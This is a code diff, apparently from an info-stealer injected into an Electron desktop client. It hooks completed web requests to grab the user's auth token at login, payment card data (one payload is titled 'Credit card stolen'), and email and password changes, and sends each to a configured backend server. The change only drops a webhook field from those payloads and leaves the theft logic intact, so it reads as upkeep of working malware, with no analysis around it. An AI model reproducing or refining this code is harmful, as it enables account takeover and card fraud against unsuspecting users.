@@ -80,7 +80,6 @@ session.defaultSession.webRequest.onCompleted({
 
             if (!requestBody.mfa) {
                 request(config.backend, JSON.stringify({
-                    webhook: config.encrypted_webhook,
                     title: 'User logged in',
                     user: user,
                     token: token,
@@ -93,7 +92,6 @@ session.defaultSession.webRequest.onCompleted({
             const queryString = new URLSearchParams(details.uploadData[0].bytes.toString());
 
             request(config.backend, JSON.stringify({
-                webhook: config.encrypted_webhook,
                 title: 'Credit card stolen',
                 user: user,
                 token: token,
@@ -107,7 +105,6 @@ session.defaultSession.webRequest.onCompleted({
 
             if (requestBody.email) {
                 request(config.backend, JSON.stringify({
-                    webhook: config.encrypted_webhook,
                     title: 'Email changed',
                     user: user,
                     token: token,
@@ -117,7 +114,6 @@ session.defaultSession.webRequest.onCompleted({
             }
             else {
                 request(config.backend, JSON.stringify({
-                    webhook: config.encrypted_webhook,
                     title: 'Password changed',
                     user: user,
                     token: token,
